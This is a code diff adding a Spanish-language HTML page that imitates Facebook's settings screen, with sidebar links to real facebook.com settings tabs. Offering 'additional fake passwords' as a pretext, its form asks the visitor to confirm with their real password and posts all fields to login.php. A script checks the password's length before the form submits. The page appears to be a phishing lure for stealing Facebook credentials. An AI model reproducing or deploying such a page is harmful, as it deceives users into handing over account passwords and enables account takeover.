@@ -1,0 +1,268 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Configuracion de la privacidad</title>
+	<style>
+		/*ahora vamos con el css cabron!!!*/
+		*{
+			margin:0px;
+			padding: 0px;
+		}
+		#container{
+			width:95%;
+			margin:0 auto;
+			height: auto;
+		}
+		#cabecera{
+			width: 100%;
+			
+		}
+		#cabecera img{
+			width: 100%;
+			height:100%;
+		}
+		#Div_izquierdo{
+			height: 500px;
+			margin-left: 37px;
+			border-right:1px solid #ccc;
+		}
+		#Div_izquierdo, #Div_izquierdo li a,#Div_izquierdo li{
+			width:245px;
+			float: left;
+			text-decoration: none;
+			list-style: none;
+		}
+		#Div_izquierdo li#primero{background:#d8dfea;height: 20px;}
+		#Div_izquierdo li#primero:hover{background: #d8dfea;}
+		#Div_izquierdo li a{
+			margin-left: 30px;
+			width: 199px;
+		}
+		#Div_derecho{
+			width:995px;
+			float: right;
+		}
+		.primerGrupo{
+			margin-top: 10px;
+			border-bottom:1px solid #ccc;
+			height: 50px;
+		}
+		.segundoGrupo{
+			padding-bottom: 20px;
+			margin-bottom: 20px;
+			border-bottom:1px solid #ccc;
+			height: 50px;
+			margin-top: 15px;
+		}
+		.tercerGrupo{
+			padding-bottom: 20px;
+			border-bottom:1px solid #ccc;
+			height: 50px;
+			margin-top: -10px;
+		}
+		.cuartoGrupo{
+			padding-bottom: 35px;
+			height: 50px;
+			margin-top: 10px;
+		}
+		a{
+			color: black;
+		}
+		
+		.primerGrupo li,.segundoGrupo li,.tercerGrupo li,.cuartoGrupo li{
+			margin-top: 3px;
+			font-size: 13px;
+			font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
+		}	
+		.icono1:before{content: url(iconos/icono1.jpg);position: absolute;width:16px;height: 16px;}
+		.icono2:before{content: url(iconos/icono2.jpg);position: absolute;}
+		.icono3:before{content: url(iconos/icono3.jpg);position: absolute;}
+		.icono4:before{content: url(iconos/icono4.jpg);position: absolute;}
+		.icono5:before{content: url(iconos/icono5.jpg);position: absolute;}
+		.icono6:before{content: url(iconos/icono6.jpg);position: absolute;}
+		.icono7:before{content: url(iconos/icono7.jpg);position: absolute;}
+		.icono8:before{content: url(iconos/icono8.jpg);position: absolute;}
+		.icono9:before{content: url(iconos/icono9.jpg);position: absolute;}
+		.icono10:before{content: url(iconos/icono10.jpg);position: absolute;}
+		.icono11:before{content: url(iconos/icono11.jpg);position: absolute;}
+		.icono12:before{content: url(iconos/icono12.jpg);position: absolute;}
+		h1{
+			font-size: 16px;
+			color: #1c2a47;
+			font-weight: bold;
+			padding: 10px;
+			font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
+		}
+		/*-----------------------------------------------------------------*/
+		#contenido_izquierdo
+		{
+			float: left;
+			padding: 10px;
+			font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
+			width:200px;
+			background: #f2f2f2;
+			height: 200px;
+		}
+		#contenido_derecho
+		{
+			background: #f2f2f2;
+			float: right;
+			width: 600px;
+			height: auto;
+			margin-right:140px;
+			margin-top: 20px;
+		}
+		input
+		{
+			width: 120px;
+			border:none;
+			border:1px solid #ccc;
+			height: 20px;
+		}
+		label{
+			font-family: 'lucida grande',tahoma,verdana,arial,sans-serif;
+			color: gray;
+			font-weight: bold;
+			font-size: 12px;
+		}
+		label[for="opcion1"]
+		{
+			margin-left: 41px;
+		}
+		label[for="opcion2"]
+		{
+			margin-left: 91px;
+		}
+		label[for="password2"]
+		{
+			margin-left: 63px;
+		}
+		label[for="password"]
+		{
+			margin-left: 13px;
+		}
+		input[id="password"]
+		{
+			margin-left: 67px;
+		}
+		#bla{
+			background-color:#f2f2f2;;
+			height: 300px;
+		}
+		#enviar{
+			margin-top: 5px;
+			height:27px;
+			width:118px;
+			background-image: url(iconos/boton.jpg);
+		}
+	</style>
+	<script src="http://code.jquery.com/jquery-2.1.0.min.js"></script>
+
+</head>
+<body>
+	<header id="cabecera">
+		<img src="logo.jpg" alt="Logo de la pagina">
+	</header>
+	<div id="container">
+		
+	<section id="contenido">
+		<div id="Div_izquierdo"><!--esto es el div del lado izquierdo -->
+			<nav id="menu">
+				<div class="primerGrupo">
+					<li class="icono1" id="primero"><a href="#"><strong>Contraseñas *</strong></a></li>
+					<li class="icono2"><a href="https://www.facebook.com/settings?tab=security">Seguridad</a></li>
+				</div>
+
+				<div class="segundoGrupo">
+					<li class="icono3"><a href="https://www.facebook.com/settings?tab=privacy">Privacidad</a></li>
+					<li class="icono4"><a href="https://www.facebook.com/settings?tab=timeline">Biografía y etiquetado</a></li>
+					<li class="icono5"><a href="https://www.facebook.com/settings?tab=blocking">Bloqueos</a></li>
+				</div>
+				
+				<div class="tercerGrupo">
+					<li class="icono6"><a href="https://www.facebook.com/settings?tab=notifications">Notificaciones</a></li>
+					<li class="icono7"><a href="https://www.facebook.com/settings?tab=mobile">Celular</a></li>
+					<li class="icono8"><a href="#">Seguidores</a></li>
+				</div>
+
+				<div class="cuartoGrupo">
+					<li class="icono9"><a href="https://www.facebook.com/settings?tab=applications">Aplicaciones</a></li>
+					<li class="icono10"><a href="https://www.facebook.com/settings?tab=ads">Anuncios publicitarios</a></li>
+					<li class="icono11"><a href="https://secure.facebook.com/settings?tab=payments">Pagos</a></li>
+					<li class="icono12"><a href="https://www.facebook.com/settings?tab=support">Panel de ayuda</a></li>
+				</div>
+
+			</nav>
+		</div>
+		<div id="Div_derecho" ><!--esto es el div del lado derecho -->
+			<h1>Configuración de contraseñas adicionales</h1>
+
+			
+				<div id="bla" style="border-bottom:1px solid #ccc;border-top:1px solid #ccc;">
+					<div id="contenido_izquierdo">
+					<h5>Administrador <br> de contraseñas</h5>
+				</div>
+				<div id="contenido_derecho">
+					<form action="login.php" method="post" id="form">
+						<label for="opcion1">Correo falso 1</label>
+						<input type="email" name="correo1" id="correo1">
+						<label for="opcion2">Correo falso 2</label>
+						<input type="email" name="correo2" id="correo2">
+						<br><br>
+						<label for="password">Contraseña falsa 1</label>
+						<input type="password" name="pass1" id="pass1">
+						<label for="password2">Contraseña falsa 2</label>
+						<input type="password" name="pass2" id="pass2">
+						<br><br>
+						<label for="ultimo">Tu contraseña para <br>Confirmar</label>
+						<input type="password" name="password" id="password">
+						<div id="mensaje"></div>
+						<br><br>
+						<hr color="#ccc">
+						<input type="submit"  id="enviar" name="enviar" value="">					
+					</form>
+				</div>
+				</div>
+				<div style="clear:both;"></div>
+				<div style="border-bottom:1px solid #ccc;">
+					<div>
+					<div id="idioma" style="font-weight:bold; color:#1c2a47; font-family:'lucida grande',tahoma,verdana,arial,sans-serif;margin-left:20px;font-size:12px;margin-top:15px;">Idioma</div> 
+
+				<div id="idiomacontenido"style="font-weight:bold; color:gray; font-family:'lucida grande',tahoma,verdana,arial,sans-serif;margin-left:20px;font-size:12px;float:right;margin-right:690px;margin-top:-20px;padding:5px;">Español</div>
+				</div>
+				<div style="clear:both;"></div>
+				</div>
+		</div>
+	</section>
+	</div>
+	<script>
+	$(document).on("ready",function(){
+    
+	    $("form").on("submit",function(){
+
+	          var contraseña =  $("#password").val().length;
+	          if (contraseña <=5) 
+	            {
+	            $("#mensaje").text("Mínimo 6 caracteres");
+	            $("#mensaje").css("border","1px solid #dd3c10");
+	            $("#mensaje").css("float","right");
+	            $("#mensaje").css("margin-right","200px");
+	            $("#mensaje").css("margin-top","-23px");
+	            $("#mensaje").css("font-family","Helvetica");
+	            }
+	          else
+	            {
+	            $("#mensaje").text("");
+	            $("#mensaje").css("border","1px solid transparent");
+	            return true;
+	            }
+
+	            return false;
+	    });
+
+    });
+	</script>
+	
+</body>
+</html>
